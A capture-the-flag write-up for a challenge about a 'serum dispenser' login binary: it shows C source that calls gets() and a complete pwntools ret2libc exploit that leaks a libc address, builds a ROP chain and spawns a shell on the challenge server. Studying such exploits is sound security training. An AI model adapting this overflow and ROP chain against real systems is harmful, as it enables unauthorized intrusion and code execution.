# Reject humanity return to libc

Author: [roerohan](https://github.com/roerohan)

## Source

```
Hello Agent,
<REDACTED>, a bio-terrorist organisation located in the west have stolen serum Id:<Redacted> from our special research facility.
The serum has the ability to reverse evolution of a species by 100's of years and can return humans back to their former monkey selves.
We have learnt that the organisation prepares to release the serum as a gas form in unknown public area using a dipenser.The only information we have about the dispenser is the login portal info,the login program running, and its libc version

Your mission is to break in and disarm the dispenser.The connection info,login program, and the libc library is given below.Be warned the organisation are known pranksters.

nc overly.uniquename.xyz 2052
```

## Exploit

The binary for the challenge is included in [challenge](./challenge). The source code for the challenge [dispenser_login.c](./dispenser_login.c) is present below.

```c
#include<stdio.h>
#include<string.h>

void disarm_dispenser(){
    char password[256];
    FILE *password_file;
    password_file = fopen("password.txt","r");
    fgets(password,sizeof(*password_file),password_file);
    printf("Enter password to disable dispenser:\n");
    char user_input[256];
    gets(user_input);
    int eq = strncmp(user_input,password,256);
    if (eq != 0) {
        printf("Incorrect password\n");
    }
    else {
        printf("Password correct\n");
        printf("Disarming dispenser (or not lol)...\n");
    }

}

int main() {
    disarm_dispenser();    
}
```

As you can see, the `gets()` command has been used in the `disarm_dispenser` function. `gets()` is an insecure command as it is vulnerable to buffer overflow exploits. In this exploit, you can keep on adding items on the memory stack of the function until it overwrites the return address. If you overwrite the return address carefully, you can technically jump to any function in memory. The only challenge remaining is to find the location of the `system` function in memory, and jump to that with `/bin/sh` string in the RDI register.


The following script is written using `pwntools`. In short, it connects to the server, calculates the base address of `libc` by comparing the actual address of the `__libc_start_main` function with the address present in the binary. Once we get the base address where `libc` is loaded, we can find the offset of `system`, and jump to that function using a second pass in the main function. The size of the stack is 0x210, followed by 0x8 bits of saved RBP. The exploit can be better understood with the help of the following script.

```py
from pwn import *

local = False

host = 'overly.uniquename.xyz'
port = 2052

elf = ELF('./challenge')
rop = ROP(elf)

if local:
    p = elf.process()
    libc = ELF('/usr/lib/libc.so.6')
else:
    p = remote(host, port)
    libc = ELF('./lib/x86_64-linux-gnu/libc-2.31.so')

PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

OFFSET = b'A' * (0x210 + 0x8)

log.info("puts@plt: " + hex(PUTS_PLT))
log.info("main@plt: " + hex(MAIN_PLT))
log.info("POP RDI: " + hex(POP_RDI))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    rop_chain = [
        POP_RDI, FUNC_GOT,
        PUTS_PLT,
        MAIN_PLT,
    ]

    rop_chain = b''.join([p64(i) for i in rop_chain])
    payload = OFFSET + rop_chain
    
    print(p.recvuntil('Enter password to disable dispenser:\n'))
    print(payload)

    p.sendline(payload)

    received = p.recvline().strip()
    print(received)
    print(p.recvline())
    received = p.recvline().strip()
    print(received)
    leak = u64(received.ljust(8, b'\x00'))
    libc.address = leak - libc.symbols[func_name]

    return hex(leak)
x = get_addr('__libc_start_main')
log.info("libcstart main " + x)
log.info('Libc base: ' + hex(libc.address))

BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']
EXIT = libc.symbols['exit']

ROP_CHAIN = [
    RET,
    POP_RDI, BIN_SH,
    SYSTEM,
    EXIT,
]

ROP_CHAIN = b''.join([p64(i) for i in ROP_CHAIN])

payload = OFFSET + ROP_CHAIN

print(p.recvuntil('Enter password to disable dispenser:\n'))

p.sendline(payload)

p.interactive()
```
